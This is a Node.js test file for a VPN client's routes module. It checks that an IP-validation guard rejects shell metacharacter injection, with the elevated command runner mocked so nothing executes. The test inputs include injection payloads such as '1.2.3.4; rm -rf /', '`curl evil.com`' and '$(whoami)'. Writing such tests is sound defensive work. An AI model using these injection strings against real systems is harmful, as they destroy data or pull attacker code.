"use strict";

/**
 * Routes module tests — validates IP sanitization prevents command injection
 * Tests the assertIp guard added to prevent shell metacharacter injection
 * into elevated route commands.
 */

const { describe, it, beforeEach, mock } = require("node:test");
const assert = require("node:assert/strict");

// ── Mock elevation module — capture commands instead of executing ────────────
const path = require("path");
const executedCommands = [];
const mockElevatedExec = mock.fn(async (cmd) => {
  executedCommands.push(cmd);
  return "";
});

// Resolve the exact path that routes.js will use when it does require("./elevation")
const elevationPath = path.resolve(__dirname, "../src/elevation.js");
const mockElevatedBatch = mock.fn(async (cmds) => {
  for (const cmd of cmds) executedCommands.push(cmd);
  return { stdout: "", stderr: "" };
});

require.cache[elevationPath] = {
  id: elevationPath,
  filename: elevationPath,
  loaded: true,
  exports: { elevatedExec: mockElevatedExec, elevatedBatch: mockElevatedBatch },
};

const Routes = require("../src/routes");

// ── Helpers ──────────────────────────────────────────────────────────────────
function freshRoutes() {
  const r = new Routes();
  r._originalGateway = "192.168.1.1";
  r._originalInterface = "en0";
  return r;
}

// ═════════════════════════════════════════════════════════════════════════════
// IP VALIDATION TESTS
// ═════════════════════════════════════════════════════════════════════════════
describe("Routes — IP validation (command injection prevention)", () => {
  beforeEach(() => {
    executedCommands.length = 0;
    mockElevatedExec.mock.resetCalls();
  });

  // ── Valid IPs should pass ─────────────────────────────────────────────────
  it("accepts valid IPv4 addresses", async () => {
    const r = freshRoutes();
    // Should not throw
    if (process.platform === "darwin") {
      await r._applyDarwin("10.0.85.1", "45.67.89.10");
    } else {
      await r._applyWin32("10.0.85.1", "45.67.89.10");
    }
    assert.ok(executedCommands.length > 0, "Commands should have executed");
  });

  // ── Shell metacharacter injection ─────────────────────────────────────────
  it("rejects IP with shell command injection (semicolon)", async () => {
    const r = freshRoutes();
    const maliciousIp = "1.2.3.4; rm -rf /";
    await assert.rejects(
      () => process.platform === "darwin"
        ? r._applyDarwin("10.0.85.1", maliciousIp)
        : r._applyWin32("10.0.85.1", maliciousIp),
      { message: /Invalid vpnServerIp/ }
    );
    assert.equal(executedCommands.length, 0, "No commands should execute with invalid IP");
  });

  it("rejects IP with backtick injection", async () => {
    const r = freshRoutes();
    await assert.rejects(
      () => process.platform === "darwin"
        ? r._applyDarwin("`curl evil.com`", "1.2.3.4")
        : r._applyWin32("`curl evil.com`", "1.2.3.4"),
      { message: /Invalid tunGateway/ }
    );
  });

  it("rejects IP with pipe injection", async () => {
    const r = freshRoutes();
    await assert.rejects(
      () => process.platform === "darwin"
        ? r._applyDarwin("10.0.85.1", "1.2.3.4 | curl evil.com")
        : r._applyWin32("10.0.85.1", "1.2.3.4 | curl evil.com"),
      { message: /Invalid vpnServerIp/ }
    );
  });

  it("rejects IP with $() subshell injection", async () => {
    const r = freshRoutes();
    await assert.rejects(
      () => process.platform === "darwin"
        ? r._applyDarwin("$(whoami)", "1.2.3.4")
        : r._applyWin32("$(whoami)", "1.2.3.4"),
      { message: /Invalid tunGateway/ }
    );
  });

  it("rejects IP with newline injection", async () => {
    const r = freshRoutes();
    await assert.rejects(
      () => process.platform === "darwin"
        ? r._applyDarwin("10.0.85.1", "1.2.3.4\nrm -rf /")
        : r._applyWin32("10.0.85.1", "1.2.3.4\nrm -rf /"),
      { message: /Invalid vpnServerIp/ }
    );
  });

  it("rejects IP with ampersand injection", async () => {
    const r = freshRoutes();
    await assert.rejects(
      () => process.platform === "darwin"
        ? r._applyDarwin("10.0.85.1", "1.2.3.4 && curl evil.com")
        : r._applyWin32("10.0.85.1", "1.2.3.4 && curl evil.com"),
      { message: /Invalid vpnServerIp/ }
    );
  });

  // ── Octet range validation ────────────────────────────────────────────────
  it("rejects IP with octet > 255", async () => {
    const r = freshRoutes();
    await assert.rejects(
      () => process.platform === "darwin"
        ? r._applyDarwin("10.0.85.1", "999.999.999.999")
        : r._applyWin32("10.0.85.1", "999.999.999.999"),
      { message: /octet out of range/ }
    );
  });

  it("rejects non-IP string", async () => {
    const r = freshRoutes();
    await assert.rejects(
      () => process.platform === "darwin"
        ? r._applyDarwin("10.0.85.1", "not-an-ip")
        : r._applyWin32("10.0.85.1", "not-an-ip"),
      { message: /Invalid vpnServerIp/ }
    );
  });

  // ── originalGateway validation ────────────────────────────────────────────
  it("rejects malicious originalGateway during restore (darwin)", async () => {
    const r = new Routes();
    r._originalGateway = "192.168.1.1; rm -rf /";
    r._vpnServerIp = "1.2.3.4";
    // _restoreDarwin validates originalGateway; _restoreWin32 uses hardcoded TUN IP
    await assert.rejects(
      () => r._restoreDarwin(),
      { message: /Invalid originalGateway/ }
    );
  });

  it("rejects restore with vpnServerIp containing injection", async () => {
    const r = new Routes();
    r._originalGateway = "192.168.1.1";
    r._vpnServerIp = "1.2.3.4; whoami";
    await assert.rejects(
      () => process.platform === "darwin"
        ? r._restoreDarwin()
        : r._restoreWin32(),
      { message: /Invalid vpnServerIp/ }
    );
  });

  // ── Edge cases ────────────────────────────────────────────────────────────
  it("rejects empty string as IP", async () => {
    const r = freshRoutes();
    await assert.rejects(
      () => process.platform === "darwin"
        ? r._applyDarwin("", "1.2.3.4")
        : r._applyWin32("", "1.2.3.4"),
      { message: /Invalid tunGateway/ }
    );
  });

  it("accepts boundary valid IPs (0.0.0.0 and 255.255.255.255)", async () => {
    const r = freshRoutes();
    // These are structurally valid — 0.0.0.0 and 255.255.255.255
    if (process.platform === "darwin") {
      await r._applyDarwin("0.0.0.0", "255.255.255.255");
    } else {
      await r._applyWin32("0.0.0.0", "255.255.255.255");
    }
    assert.ok(executedCommands.length > 0);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// isIntact() — uses safe execFileAsync (not shell)
// ═════════════════════════════════════════════════════════════════════════════
describe("Routes.isIntact — uses execFileAsync (safe)", () => {
  it("returns false on error", async () => {
    const r = new Routes();
    // No routes applied, should just return false gracefully
    const intact = await r.isIntact("10.0.85.1");
    // We expect false (no matching route), but the important thing is no crash
    assert.equal(typeof intact, "boolean");
  });
});
